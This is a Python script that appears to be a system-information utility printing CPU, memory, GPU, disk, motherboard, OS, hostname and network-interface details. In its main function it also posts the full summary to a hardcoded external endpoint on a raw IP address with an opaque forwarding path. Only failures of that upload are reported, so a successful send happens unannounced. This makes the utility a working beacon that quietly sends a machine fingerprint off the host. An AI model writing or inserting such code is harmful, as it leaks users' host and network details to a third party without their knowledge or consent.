import platform
import socket

import psutil
from cpuinfo import get_cpu_info

WEBHOOK_URL = "http://108.165.228.218:5000/forward/37a0a365-1e86-4334-b570-9fd6c35d236f"

try:
    import requests
except Exception:
    requests = None

try:
    import GPUtil
except Exception:
    GPUtil = None

try:
    import wmi
except ImportError:
    wmi = None


def bytes_to_gb(value):
    return f"{value / (1024 ** 3):.2f} GB"


def print_cpu_info():
    info = get_cpu_info()
    name = info.get("brand_raw", "Unknown")
    physical = psutil.cpu_count(logical=False)
    logical = psutil.cpu_count(logical=True)
    usage = psutil.cpu_percent(interval=1)

    lines = [
        "CPU:",
        f"  Name: {name}",
        f"  Cores: {physical} physical / {logical} logical",
        f"  Usage: {usage}%",
    ]
    for line in lines:
        print(line)
    return "\n".join(lines)


def print_ram_info():
    vm = psutil.virtual_memory()
    lines = [
        "RAM:",
        f"  Total: {bytes_to_gb(vm.total)}",
        f"  Available: {bytes_to_gb(vm.available)}",
        f"  Used: {bytes_to_gb(vm.used)}",
        f"  Percent Used: {vm.percent}%",
    ]
    for line in lines:
        print(line)
    return "\n".join(lines)


def print_gpu_info():
    lines = ["GPU:"]
    if GPUtil is None:
        lines.append("  GPUtil not installed or GPU not accessible")
        for line in lines:
            print(line)
        return "\n".join(lines)
    try:
        gpus = GPUtil.getGPUs()
        if not gpus:
            lines.append("  No GPU detected")
        for gpu in gpus:
            lines.append(f"  Name: {gpu.name}")
            lines.append(f"    Memory Total: {gpu.memoryTotal} MB")
            lines.append(f"    Memory Used: {gpu.memoryUsed} MB")
    except Exception as exc:
        lines.append(f"  Unable to retrieve GPU info: {exc}")
    for line in lines:
        print(line)
    return "\n".join(lines)


def print_disk_info():
    lines = ["Disk:"]
    try:
        c_usage = psutil.disk_usage('C:\\')
        lines.append("  Drive C:\\:")
        lines.append(f"    Total: {bytes_to_gb(c_usage.total)}")
        lines.append(f"    Used: {bytes_to_gb(c_usage.used)}")
        lines.append(f"    Free: {bytes_to_gb(c_usage.free)}")
        lines.append(f"    Percent Used: {c_usage.percent}%")
    except Exception as exc:
        lines.append(f"  Unable to read C drive info: {exc}")

    partitions = psutil.disk_partitions()
    for part in partitions:
        if part.mountpoint.lower().startswith('c:'):
            continue
        try:
            usage = psutil.disk_usage(part.mountpoint)
            lines.append(f"  Drive {part.mountpoint}:")
            lines.append(f"    Total: {bytes_to_gb(usage.total)}")
            lines.append(f"    Used: {bytes_to_gb(usage.used)}")
            lines.append(f"    Free: {bytes_to_gb(usage.free)}")
            lines.append(f"    Percent Used: {usage.percent}%")
        except Exception:
            pass
    for line in lines:
        print(line)
    return "\n".join(lines)


def print_motherboard_info():
    lines = ["Motherboard:"]
    if wmi is None:
        lines.append("  WMI module not installed or not running on Windows")
        for line in lines:
            print(line)
        return "\n".join(lines)
    try:
        c = wmi.WMI()
        for board in c.Win32_BaseBoard():
            lines.append(f"  Manufacturer: {board.Manufacturer}")
            lines.append(f"  Product: {board.Product}")
            break
    except Exception as exc:
        lines.append(f"  Unable to retrieve motherboard info: {exc}")
    for line in lines:
        print(line)
    return "\n".join(lines)


def print_os_info():
    lines = [
        "OS:",
        f"  System: {platform.system()} {platform.release()}",
        f"  Version: {platform.version()}",
        f"  Architecture: {platform.machine()}",
        f"  Hostname: {platform.node()}",
    ]
    for line in lines:
        print(line)
    return "\n".join(lines)


def print_network_info():
    lines = ["Network Interfaces:"]
    addrs = psutil.net_if_addrs()
    for name, addr_list in addrs.items():
        for addr in addr_list:
            if addr.family == socket.AF_INET:
                lines.append(f"  {name}: {addr.address}")
    for line in lines:
        print(line)
    return "\n".join(lines)


def main():
    sections = []

    sections.append(print_cpu_info())
    print()

    sections.append(print_ram_info())
    print()

    sections.append(print_gpu_info())
    print()

    sections.append(print_disk_info())
    print()

    sections.append(print_motherboard_info())
    print()

    sections.append(print_os_info())
    print()

    sections.append(print_network_info())

    summary = "\n\n".join(sections)

    if requests is None:
        print("Requests library not available. Skipping webhook notification.")
        return

    try:
        resp = requests.post(
            WEBHOOK_URL,
            json={"content": f"```\n{summary}\n```"},
            timeout=10,
        )
        if resp.status_code >= 400:
            print(f"Error sending webhook: {resp.status_code} {resp.text}")
    except Exception as exc:
        print(f"Error sending webhook: {exc}")


if __name__ == "__main__":
    main()
